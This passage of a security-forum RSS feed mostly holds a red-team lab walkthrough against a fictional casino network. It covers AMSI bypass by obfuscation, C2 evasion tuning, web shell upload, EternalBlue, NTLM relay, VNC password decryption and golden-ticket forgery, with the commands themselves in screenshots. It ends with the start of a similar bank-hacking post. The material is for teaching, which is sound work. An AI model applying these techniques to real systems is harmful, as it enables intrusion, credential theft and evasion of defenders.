<p>[1] <a href="https://cyberhound.com/the-great-fish-tank-hack/" rel="noopener nofollow ugc">https://cyberhound.com/the-great-fish-tank-hack/</a></p>
<p>[2] <a href="https://easydmarc.com/blog/7-common-internet-of-things-iot-attacks-that-compromise-security/" rel="noopener nofollow ugc">https://easydmarc.com/blog/7-common-internet-of-things-iot-attacks-that-compromise-security/</a></p>
<p>[3] <a href="https://www.metasploit.com/" rel="noopener nofollow ugc">https://www.metasploit.com/</a></p>
<p>[4] <a href="https://github.com/RustScan/RustScan" class="inline-onebox" rel="noopener nofollow ugc">GitHub - RustScan/RustScan: 🤖 The Modern Port Scanner 🤖</a></p>
<p>[5] <a href="https://nmap.org/" rel="noopener nofollow ugc">https://nmap.org/</a></p>
<p>[6] <a href="https://www.psychologytoday.com/us/blog/connect-creativity/201311/question-everything-everywhere-forever" class="inline-onebox" rel="noopener nofollow ugc">Question Everything, Everywhere, Forever | Psychology Today</a></p>
<p>[7] <a href="https://www.exploit-db.com/searchsploit" class="inline-onebox" rel="noopener nofollow ugc">Exploit Database SearchSploit Manual</a></p>
<p>[8] <a href="https://www.informaticar.net/join-ubuntu-22-04-to-microsoft-active-directory-domain/" class="inline-onebox" rel="noopener nofollow ugc">Join Ubuntu 22.04 to Microsoft Active Directory domain | IT Blog</a></p>
<p>[9] <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" class="inline-onebox" rel="noopener nofollow ugc">Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog</a></p>
<p>[10] <a href="https://manpages.ubuntu.com/manpages/trusty/man8/adcli.8.html" class="inline-onebox" rel="noopener nofollow ugc">Ubuntu Manpage: adcli - Tool for performing actions on an Active Directory domain</a></p>
<p>[11] <a href="https://github.com/the-useless-one/pywerview" class="inline-onebox" rel="noopener nofollow ugc">GitHub - the-useless-one/pywerview: A (partial) Python rewriting of PowerSploit's PowerView</a></p>
<p>[12] <a href="https://github.com/SecuProject/ADenum?tab=readme-ov-file" class="inline-onebox" rel="noopener nofollow ugc">GitHub - SecuProject/ADenum: AD Enum is a pentesting tool that allows to find misconfiguration through the the protocol LDAP and exploit some of those weaknesses with kerberos.</a></p>
<p>[13] <a href="https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html" class="inline-onebox" rel="noopener nofollow ugc">The ldapsearch Command-Line Tool</a></p>
<p>[14] <a href="https://www.crowdstrike.com/cybersecurity-101/kerberoasting/" class="inline-onebox" rel="noopener nofollow ugc">What is a Kerberoasting Attack? â CrowdStrike</a></p>
<p>[15] <a href="https://github.com/the-useless-one/pywerview" class="inline-onebox" rel="noopener nofollow ugc">GitHub - the-useless-one/pywerview: A (partial) Python rewriting of PowerSploit's PowerView</a></p>
<p>[16] <a href="https://jqlang.github.io/jq/" class="inline-onebox" rel="noopener nofollow ugc">jq</a></p>
<p>[17] <a href="https://docs.projectdiscovery.io/tools/nuclei/overview" class="inline-onebox" rel="noopener nofollow ugc">Nuclei Overview - ProjectDiscovery Documentation</a></p>
<p>[18] <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" class="inline-onebox" rel="noopener nofollow ugc">WSTG - v4.2 | OWASP Foundation</a></p>
<p>—-[ Deeper in the Network ]————————————————————————————————–</p>
<p>With LFI as our potential lateral movement technique to move deeper onto the network we have to use this in our advantage to gain access to the remote host, now remember previously the SSH port, this tells us as attackers that there is an SSH server running and probably a potential way to access this host, with our previous enumeration using pywerview I can grab a list of domain users and start brute forcing for interesting files in their home directory folders since we are aware that SSH is running I’ll start looking for SSH related files, I do want to mention another potential tool for this is netexec[1] with multiple protocols and modules available for us to work with, we could potentially locate different paths to gain access or maybe just simple enumeration as seen below where I grab usernames:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-196.png?w=624" alt="" width="624" height="137" role="presentation"></p>
<p>Now with this user list I’ll build a small pythons script to locate interesting files like public, or private SSH keys which we will find using this vulnerability it’s a valuable skill to try and automate some things by utilizing languages such as python or scripting languages such as BASH using the tools manually is great as well but if you really want to make your life easy when hacking or trying to reach the same spot again automation is the recommended way, now below we see the script at work</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-197.png?w=624" alt="" width="539" height="500" role="presentation"></p>
<p>With jnovoa’s private SSH key I use it to login onto the workstation these SSH connections if set up with default values they give the user Administrator Privileges onto the workstation, of course this only applied if the user is in the local Administrator group</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-198.png?w=624" alt="" width="624" height="127" role="presentation"></p>
<p>Now that we are currently in this windows workstation we can move onto utilizing our C2 framework for a more dedicated attack using a payload with all our tools loaded we do have to be careful to edit and customize this as much as possible to leave a different fingerprint than the already known ones from Empire for example take a look at the following payload, you will notice a detection but not based on signature but behavior since detection’s are commonly done via static, behavior and heuristics we do have to consider what is being detected and why:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-199.png?w=624" alt="" width="624" height="430" role="presentation"></p>
<p>Since the method of behavior was at fault, I do want to apply some evasions that can aid in avoiding detection’s when I am trying my PowerShell agents, especially since they come in a command-line method where I need to copy and paste the command onto the terminal my first approach is trying to avoid any static detection’s in this case it’s AMSI.</p>
<p>Now since I am running purely with PowerShell, I like to use some tools for AMSI String detection most of these bypass work by obfuscating strings that trigger AMSI when running here is a simple example of this behavior or method of detection quite simple and yet effective to understand some AV products.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-200.png?w=624" alt="" width="624" height="108" role="presentation"></p>
<p>Literally just a word and received a flag by Defender and AMSI telling me this is malicious but if we apply some slight obfuscation, I can use the word with no warnings whatsoever:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-201.png?w=501" alt="" width="501" height="96" role="presentation"></p>
<p>Now we want to apply a “patch” to AMSI to avoid these triggers, the way this works is that if we can tell AMSI that all the strings being passed to it are Benign then everything will be ignored by AMSI, the patch I’ll be working with is one by Adam Chester[2] so here is the patch[3] but of course this out the box is going to get flagged so I like to test it with AMSITRIGGER[4]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-202.png?w=381" alt="" width="381" height="135" role="presentation"></p>
<p>Looking at this output seems that the bad word here is AMSI now the file is using C# embedded in a PowerShell script since PowerShell can interact with the CLR which runs C# I can actually use obfuscation techniques meant for C# so now I will base64 this string and decode it on the fly.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-203.png?w=624" alt="" width="624" height="16" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-213.png?w=422" alt="" width="422" height="126" role="presentation"></p>
<p>Now with the method above I utilized a Base64 Decoding method native to C# and encoded the malicious string, this time now the file is flagged as malicious but executing still causes problems:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-214.png?w=624" alt="" width="624" height="388" role="presentation"></p>
<p>The cat and mouse game, now all the tools even Defender tells me it’s ok but remember since there is no execution Defender can’t check or analyze it via behavior so this will need to execute to give it a different type of scanning method, since this is the theory I’m working on, one method I like to try instead of running the script using IEX and such I like to copy/paste the entire script since I would like to think that Defender is thinking that these are just regular commands run by a user but it’s me guessing that, that’s what’s going on, this is only possible because I have a full terminal that I can access and paste these commands onto the terminal:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-215.png?w=624" alt="" width="624" height="77" role="presentation"></p>
<p>Now this time the malicious strings are no longer being flagged but errors are now shown this is good as it means that any malicious word doesn’t kill my payload or cause a detection, PowerShell just thinks it’s a functions or some sort of operable program to execute. Now from here we can move on and capture our first working agent from Empire:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-216.png?w=624" alt="" width="624" height="238" role="presentation"></p>
<p>Now here I’ve shown how to avoid the static string detection, but we were talking about behavior based, since this scenario requires a lot of tinkering all I can give here is advise on what one can do for evading these detection’s I’ll explain some of these in parts</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-217.png?w=624" alt="" width="624" height="47" role="presentation"></p>
<p>The Malleable profile is the network traffic that will be used to spoof and blend in our C2 to agent communication this needs to make sense in a way we don’t want to give ourselves away by using strange traffic like a bogus website that just go up and running and it just so happens to communicate inside this network only.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-218.png?w=624" alt="" width="624" height="48" role="presentation"></p>
<p>If possible use Certificates for your traffic this makes it look more legitimate in current times https traffic uses certs to encrypt the network traffic this helps in the case of making it look like legitimate https traffic just because of the simple fact that it is signed, the cert can be self-signed and still be ignored in some cases.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-219.png?w=624" alt="" width="624" height="50" role="presentation"></p>
<p>The working hours is a setting that avoids your agent to speak out to your C2 server when you aren’t even on it yourself, that way you can avoid weird network requests at odd hours of work. Mostly these configurations come within Empire itself but the profile [5] can accept custom settings as well.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-220.png?w=244" alt="" width="244" height="102" role="presentation"></p>
<p>The spawning process, the sleep time, the jitter, the pipe names used for SMB listeners and more diving deeper into the profiles will help you avoid detection’s as well, play with them and try some creative stuff on your own [6][7].</p>
<p>Perfect now from here we can start grabbing more info, look for potential passwords, interesting files, the whole 9 yards to grab as much as possible from the host, now some things I personally like to take a look at are processes and the security product we are going up against, Empire has modules that can be utilized to execute in memory from the current or any live agents that we have for example the antivirus module to locate the security product running:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-221.png?w=624" alt="" width="624" height="453" role="presentation"></p>
<p>And the output is as follows:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-222.png?w=624" alt="" width="624" height="209" role="presentation"></p>
<p>I just ran this to verify other security products weren’t on the host, but since my payloads worked It is highly unlikely that was the case because if it were EDR or some other layer of security getting around it would have been trickier.</p>
<p>I want to also take some time to look for interesting files, processes anything that might give me an idea on what’s going on the network Empire has useful modules for this type of approach a built in SauronEye module an interesting C# tool built for fast searches built into Empire utilizing PowerShell</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-223.png?w=624" alt="" width="624" height="475" role="presentation"></p>
<p>I do however disable the search file contents as this will take more time and resources, also this would be noisy when something trying to read files at a high speed but once that is settled I can check the files manually by downloading them individually.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-224.png?w=624" alt="" width="624" height="301" role="presentation"></p>
<p>I’ve downloaded the file for analysis and just viewed a report on the Casino’s winnings since the files are within the docker you need to copy them locally [8]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-225.png?w=624" alt="" width="624" height="308" role="presentation"></p>
<p>Since the file was contained in a docker I have to copy[5] the file from it into my local station, take some time to explore the environment you would be surprised on the stuff you would find passwords, keys, databases, PII the list goes on and on tools like Empire, some C# other’s in PowerShell, Nim, Go the possibilities are endless give them a try and look for yourself you might find quick wins, <em>COUGH</em> “Passwords.xlsx” <em>COUGH</em></p>
<p>[1] <a href="https://www.netexec.wiki/" rel="noopener nofollow ugc">https://www.netexec.wiki/</a></p>
<p>[2] <a href="https://twitter.com/_xpn_" rel="noopener nofollow ugc">https://twitter.com/_xpn_</a></p>
<p>[3] <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#adam-chester-patch" class="inline-onebox" rel="noopener nofollow ugc">GitHub - S3cur3Th1sSh1t/Amsi-Bypass-Powershell: This repo contains some Amsi Bypass methods i found on different Blog Posts.</a></p>
<p>[4] <a href="https://github.com/RythmStick/AMSITrigger" class="inline-onebox" rel="noopener nofollow ugc">GitHub - RythmStick/AMSITrigger: The Hunt for Malicious Strings</a></p>
<p>[5] <a href="https://github.com/BC-SECURITY/Malleable-C2-Profiles/blob/master/Normal/gmail.profile" class="inline-onebox" rel="noopener nofollow ugc">Malleable-C2-Profiles/Normal/gmail.profile at master · BC-SECURITY/Malleable-C2-Profiles · GitHub</a></p>
<p>[6] <a href="https://github.com/Tylous/SourcePoint" class="inline-onebox" rel="noopener nofollow ugc">GitHub - Tylous/SourcePoint: SourcePoint is a C2 profile generator for Cobalt Strike command and control servers designed to ensure evasion.</a></p>
<p>[7] <a href="https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/" rel="noopener nofollow ugc">https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/</a></p>
<p>[8] <a href="https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host" class="inline-onebox" rel="noopener nofollow ugc">Copying files from Docker container to host - Stack Overflow</a></p>
<p>—-[Enumeration]—————————————————————————————————————</p>
<p>I need to locate my next host and potential access to it, since staying locally is no longer necessary as I am Administrator Privileges from the SHH connection we can start looking for potential AD attacks such as Unconstrained Delegation, Constrained Delegation, Kerberoasting, AS-REPRoasting, Shadow Credentials, Active Directory Certificate Services and others but my enumeration actually didn’t point me anything crazy as such I did locate AS-REP but it was for a user I already hold with access to nowhere else now port scans are rare on internal networks specially since they tend to be very noisy, but sometimes with a little bit of creativity and time we can actually gather good information as I did previously using nmap via proxychains but now I don’t need that amount of info yet and Empire has a built in port-scanner in PowerShell running the module shows me interesting output.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-226.png?w=410" alt="" width="410" height="156" role="presentation"></p>
<p>Having the open port information lets me apply a targeted scan to wat information I want to gather this way I am not guessing and trying multiple ports at a time and only focusing my information gathering at the openly available ones in this case port 80 and 445 are the most interesting ones, I’ve utilized the same methods as previously with nmap to avoid detection.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-227.png?w=624" alt="" width="624" height="478" role="presentation"></p>
<p>The HTTP protocol and the well known port 445 SMB running on a Windows 7 machine potentially vulnerable to the Eternablue[1] exploit are the interesting ones I’ll take the approach at looking at port 80 but remember the port isn’t open to the internet so setting up a reverse proxy onto the Browser should be a potential next step this time I will setup a Local Port forward with SSH since I know the target server and the port I am trying to reach I can tell SSH to do that with the “-L” flag:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-228.png?w=624" alt="" width="624" height="31" role="presentation"></p>
<p>Now I can reach the HTTP server from my local machine as the request will be forwarded to this location, my next step is to utilize a directory brute force technique I am aware the service is running on Microsoft IIS but I only know the existence of the main page, these tend to contain a directory only known to the internal employees but the “vulnerability” here is that these directories tend to have common or well-known names such for example: secret, uploads, admin, configuration and so on. A tool popular for this well-known technique is feroxbuster [2] a popular directory tool written in Rust, it has tons of great features but will be focusing on a few ones that I know won’t crash the server and gives us sufficient information to look for:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-229.png?w=624" alt="" width="624" height="64" role="presentation"></p>
<pre><code class="lang-auto">----[FeroxBuster]-------------------------------------------------------------------

--depth 1: This tells feroxbuster to only go 1 level deep in the directory scanning

--auto-bail: If feroxbuster encounters multiple errors then stop

--silent: I don't want all the output just the directories found

-x: The extensions I want to apply to the words in the wordlist, experience and some documentation will allow you to recognize the type of file types accepted on the HTTP Service running

-A: Use a random user Agent when scanning to avoid some detection

-w: The wordlist I want to use in the directory scanning

----[FeroxBuster]----------------------------------------------------------------
</code></pre>
<p>The previous output shows me that an uploads and uploads.html directory have been found one is empty but the other one actually gives me the option to upload files, now the trick here is to utilize a compatible web shell to run on a window workstation since we are aware ASPX files are utilized we can actually take advantage of this language usually Linux distros that are for pentesting or offensive development contain some great examples to utilize for web shells but these can be found on the internet as well just be careful for backdoors as you don’t want to hack yourself</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-230.png?w=389" alt="" width="389" height="99" role="presentation"></p>
<p>Let’s try uploading our payload, now that we have the directory to upload and the directory where the uploads go to, we can interact with our uploaded payload.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-231.png?w=624" alt="" width="624" height="286" role="presentation"></p>
<p>I’ve uploaded an aspx file webshell.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-232.png?w=527" alt="" width="527" height="328" role="presentation"></p>
<p>Visiting the payload directly I can interact with the webshell which gives me a prompt for code execution.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-233.png?w=624" alt="" width="624" height="485" role="presentation"></p>
<p>Now I’ll upgrade to an Empire agent to utilize the tools built within again and keep my enumeration running, but I do have to be creative and fix some formatting with my agent since I was receiving errors when executing the PowerShell command from Empire, once I get an agent calling back, I see the current user being DefaultAppPool</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-234.png?w=624" alt="" width="624" height="67" role="presentation"></p>
<p>Sometimes you will encounter some issues since the host is running Windows 7 host or older generations of Windows mostly C2’s in this age focus on Windows 10 and above so they tend to have a little more trouble with targeting these systems, but they still exist!! Not as quite as popular in the day but believe me as small as 2% I’ve encounter these systems myself don’t focus to much, but give them a little research you’d be surprised the area of possibilities in operating systems like these so mix your technique catch shells with ncat or maybe use well know tools such as Metasploit this one has been available since 2003 so they’ve had some work done with the generations of windows when they started.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-235.png?w=624" alt="" width="624" height="429" role="presentation"></p>
<p>I’ve used a little bit of creativity and testing when using a PowerShell reverse shell used for Version 5.0 and above, some character escaping and encoding are quite helpful in this scenario as some modules and functions didn’t exist until later versions of PowerShell this is just a neat little example for a basic reverse shell, don’t!!! But it’s still there just in case, but don’t, since the communication is simple TCP with no encryption.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-236.png?w=624" alt="" width="624" height="173" role="presentation"></p>
<p>—-[Extra, Extra!!: Exploitation]———————————————————————————————</p>
<p>I want to demonstrate an alternative to the WebApp option for lateral movement in our nmap scan we also encountered that port 445 was available for exploration if we take a better look you can tell that it’s running on Windows 7 Service Pack 1 vulnerable to EternalBlue Exploit there are multiple ways to approach this technique we can utilize Metasploit[6], or directly from Empire we can also take a look at open source projects that utilize this exploit for giving us a reverse shell but do be careful of what you are running from the internet there are some jokesters out there giving out fake exploits, trolls or actually backdoor to your attacking machine, things to consider when running Open Source tooling, is building a reputation[7] where we know this isn’t malicious it’s quite hard so just an idea.<br>
In my first method I’ll use Metasploit for it take a look at the following screenshot noticing the options available for the exploit</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-237.png?w=624" alt="" width="624" height="277" role="presentation"></p>
<p>I’ve added all the required values to the exploitation module now when I execute, I will be catching a reverse shell via ncat since the shellcode is simply using an msfvenom shellcode, proceeding with executing the module from Empire building the shellcode with msfvenom is quite simple.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-238.png?w=624" alt="" width="624" height="177" role="presentation"></p>
<p>Now all we need to do is place the shellcode that’s between the curly brackets onto the value “Shellcode” in Empire, when executing this module, I will receive a callback onto my ncat listener</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-239.png?w=624" alt="" width="624" height="265" role="presentation"></p>
<p>The previous screenshots demonstrates the successful exploit and capturing of a reverse shell connection, since the setup used here was an ncat shell, play around to capture maybe on a different C2 or straight from Empire but since it’s tricky working from a Docker I stopped here but I do recommend giving this method a try, in my case I’ve encountered errors I won’t even bother since the OS is not on the supported list of Empire maybe giving it a try with Kali Linux should work</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-240.png?w=624" alt="" width="624" height="132" role="presentation"></p>
<p>—-[End Exploitation]———————————————————————————————————–</p>
<p>From here I can start enumerating when I looked at potential privilege escalation techniques or lateral movement techniques as well as credential access techniques, an interesting location to look at is the scheduled tasks location.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-241.png?w=624" alt="" width="624" height="116" role="presentation"></p>
<p>With windows 7, 8, 10, 11 the Task information has slightly changed here we can actually locate an XML file in the System32 folder, but in later versions I have to locate the Task information via Registry Keys, luckily for me in Windows 7 the XML file exists.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-242.png?w=593" alt="" width="593" height="120" role="presentation"></p>
<p>Reading that file I can see that the mgarcia user is trying to run a ps1 file, so I have some options to elevate my privileges to manipulate the scheduled task, read the ps1 file and hope for credentials or replace it, grab credentials from the scheduled task or capture hashes since I see no credentials on the task itself and the file has no hard-coded credentials since it is running in the context of mgarcia which I will assume the it is using NetNTLMv2[3] for authentication I can probably elevate my privileges using the HotPotato[4] technique or it’s other variants or maybe try and capture the hashes, but since I am aware that all the passwords are complicated passwords that would take time in cracking I will apply the NTLM Relay[5] technique in summary.</p>
<p>I will respond to the NetNTLM request, but I won’t be capturing the hashes instead I will use ntlmrelay to relay or send the hashes to another workstation where the user is an Administrator and with that I can gain command execution and keep moving forward</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-243.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<p>In the screenshot above I told ntlmrelay to target the 10.10.1.138 IP which I know it’s the next workstation, we can actually pass it a list of IPs but beware of SMB Signing[5] this has to be disabled, since the function tells if someone has changed a message during transmission, then the hashes won’t match, and SMB will know that someone tampered with the data. The signature also confirms the sender’s and receiver’s identities.</p>
<p>A good tool for testing this is via netexec.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-244.png?w=624" alt="" width="624" height="124" role="presentation"></p>
<p>I now utilized the relay technique to execute a PowerShell Empire agent on the targeted workstation.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-245.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<p>I can now interact with the new agent.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-246.png?w=624" alt="" width="624" height="182" role="presentation"></p>
<p>Now with the final workstation compromised I have access to everything, right? not really I don’t have DA and the current user isn’t even a user it’s a workstation account (SYSTEM) now for the final goal I have to reach the DC (Domain Controller) I’ll did a quick nmap scan to check what are my possibilities to move onto the next workstation</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-247.png?w=624" alt="" width="624" height="436" role="presentation"></p>
<p>A little more detailed port scan on the VNC ports</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-248.png?w=624" alt="" width="624" height="308" role="presentation"></p>
<p>Now TightVNC[7] holds the password in the Registry Keys, since we have SYSTEM level access we can read the Keys and find the values of those keys since VNC is enabled on this workstation and the Domain Controller</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-249.png?w=624" alt="" width="624" height="114" role="presentation"></p>
<p>Now VNC uses a hard-coded DES key to store credentials. The same key is used across multiple product lines. To decrypt this, we can actually use a Linux One Liner</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-251.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I can utilize a RealVNC[8] Viewer client via the proxy, but I do recommend utilizing the same applications as the environment just in case any new signatures that don’t belong are left on the network connection.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-252.png?w=624" alt="" width="624" height="418" role="presentation"></p>
<p>Now I could dump hashes in the Domain but we wan to be quite remember!! So instead of dumping all the NTLM hashes available in the DC I’ll just grab myself a Golden Ticket for my persistence for that I will grab the AES hash of KRBTGT.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-253.png?w=624" alt="" width="624" height="122" role="presentation"></p>
<p>And now I can use Rubeus to create a Golden Ticket [10]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-254.png?w=624" alt="" width="624" height="293" role="presentation"></p>
<p>Rubeus will output a Base64 encoded ticket which we can pass onto our current session and enumerate the Domain Controller</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-255.png?w=624" alt="" width="624" height="455" role="presentation"></p>
<p>And with that we have gain complete Domain Dominance over the network at Tropicana Royale Casino, we gained Initial Access via Exploiting a public application used on a “IOT” Device which contained an RCE exploit, enumerated the Active Directory in a Linux OS environment, bypassed security products understanding it at a high-level our detection’s on the “why” and some of the “how” utilized a C2 framework inside a Docker container, setup python virtual environments for our tools, persistence via stolen SSH Keys, Lateral Movement with Web Application exploitation, Internal Running Services exploitation to run custom shellcode (EternalBlue), NTLM Relay, found interesting files, some advice on Malleable profiles, protocols used in an AD, Proxies, Golden Tickets for Persistence and other techniques.</p>
<p>Well thanks for following me in this little Adventure. Hopefully it was entertaining and gave you some insight on my POV in hacking and Red Team and of course some small red team knowledge. Now go and Rob Casinos!!!</p>
<p><em>Legally…</em></p>
<p>[1] <a href="https://en.wikipedia.org/wiki/EternalBlue" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/EternalBlue</a></p>
<p>[2] <a href="https://github.com/epi052/feroxbuster" rel="noopener nofollow ugc">https://github.com/epi052/feroxbuster</a></p>
<p>[3] <a href="https://en.wikipedia.org/wiki/NTLM" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/NTLM</a></p>
<p>[4] <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" rel="noopener nofollow ugc">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></p>
<p>[5] <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing" rel="noopener nofollow ugc">https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing</a></p>
<p>[6] <a href="https://www.metasploit.com/" rel="noopener nofollow ugc">https://www.metasploit.com/</a></p>
<p>[7] <a href="https://www.wired.com/story/jia-tan-xz-backdoor/" rel="noopener nofollow ugc">https://www.wired.com/story/jia-tan-xz-backdoor/</a></p>
<p>[8] <a href="https://notes.offsec-journey.com/enumeration/vnc" rel="noopener nofollow ugc">https://notes.offsec-journey.com/enumeration/vnc</a></p>
<p>[9] <a href="https://www.realvnc.com/" rel="noopener nofollow ugc">https://www.realvnc.com/</a></p>
<p>[10] <a href="https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/" rel="noopener nofollow ugc">https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/</a></p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-rob-a-casino/40556">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-rob-a-casino/40556</link>
          <pubDate>Thu, 16 May 2024 12:43:30 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40556</guid>
          <source url="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss">How To Rob a Casino</source>
        </item>
        <item>
          <title>Bypassing Bitlocker</title>
          <dc:creator><![CDATA[WhiteNoob]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Is it possible to bypass (in any way) bitlocker encryption? With very powerful software perhaps?</p>
            <p><small>9 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/bypassing-bitlocker/37433">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/bypassing-bitlocker/37433</link>
          <pubDate>Tue, 17 Oct 2023 19:26:23 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37433</guid>
          <source url="https://0x00sec.org/t/bypassing-bitlocker/37433.rss">Bypassing Bitlocker</source>
        </item>
        <item>
          <title>How To Rob a Bank</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <h1><a name="how-to-rob-a-bank-1" class="anchor" href="https://0x00sec.org#how-to-rob-a-bank-1"></a>How to Rob a Bank</h1>
<p>Yes I know the name of the post is very intriguing and you probably think I am throwing a tutorial on How to actually Rob Banks, but not really this blog comes from a story that I wanted to demonstrate with a little bit of images and demos, the Cayman Bank manifesto from Phineas Phisher [1] and some other APT examples, but also I wanted to demonstrate this in a fun scenario all in Virtual Machines and copying <em>SOME</em> of the techniques utilized for this Bank Hack.</p>
<p>This isn’t meant for one to think that they will be Elite Hackers for hacking Banks and such, it’s only a fun scenario where I challenge myself to keep learning and maintain sharp skillZ.</p>
<p>But let’s modify some of the things that he did of course and make it a little more Red.</p>
<p>When he was talking about his skills their was a mention on how he wasn’t an APT or some elite hacker where he has a team that builds custom tools, just a guy that lives off the land[2] like Phineas say’s “I’m just one guy” . Yeah, he doesn’t seem to like the cyber security community as we have fallen to protecting the greater evil that is mentioned a couple times, like Big Corps, Mans in suits, Corrupt Law Enforcement. As cool as it sounds living the dangerous life, the hacker vigilante Mr. Robot style of life, we can’t all afford that, as we got a lot to lose, but what if we didn’t??[3].</p>
<p>Let’s say these boundaries have seize to exist, we got nothing to worry about we don’t care anymore, we start doing things that we never even imagined doing, which in this example is to Rob a Bank. As the techniques mentioned were a little bit old, but still reliable such as using [4] PowerShell. I’ll take it up a notch since so many security protections have been deployed and with the technology BOOM from COVID we have noticed some incredible features both in Offensive and Defensive, so the security features I’ve implemented will be similar to a small bank with some security, the IT guy knows his stuff but to a level.</p>
<p>[1] <a href="https://theanarchistlibrary.org/category/author/phineas-fisher" class="inline-onebox" rel="noopener nofollow ugc">Phineas Fisher | The Anarchist Library</a></p>
<p>[2] <a href="https://lolbas-project.github.io/" rel="noopener nofollow ugc">https://lolbas-project.github.io/#</a></p>
<p>[3] <a href="https://www.youtube.com/shorts/bJontrTa3VU" rel="noopener nofollow ugc">”It’s Only After We’ve Lost Everything That We’re Free To Do Anything”</a></p>
<p>[4] <a href="https://twitter.com/424f424f/status/1383256013994749954" rel="noopener nofollow ugc">https://twitter.com/424f424f/status/1383256013994749954</a></p>
<p><strong>Infrastructure</strong></p>
<p><em>########### Stay Safe ###########</em></p>
<ol>
